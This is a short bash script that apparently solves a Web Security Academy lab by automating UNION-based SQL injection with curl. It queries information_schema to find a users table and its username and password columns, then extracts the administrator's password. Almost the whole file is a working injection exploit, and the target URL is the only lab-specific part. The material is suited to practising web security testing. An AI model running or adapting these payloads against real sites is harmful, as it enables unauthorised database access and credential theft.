#!/bin/bash

table=$(curl -s "https://ac1d1f331f94d0aa8024006100140018.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--" | html2text | grep users)

columns=$(curl -s "https://ac1d1f331f94d0aa8024006100140018.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_etagep%27--" | html2text | grep -E "password|username" > columns)

column_password=$(cat columns| grep password)
column_username=$(cat columns| grep username)

curl -s "https://ac1d1f331f94d0aa8024006100140018.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+$column_username,$column_password+FROM+$table--" | html2text | grep administrator | awk '{ gsub(/[ ]+/," "); print }'
rm columns
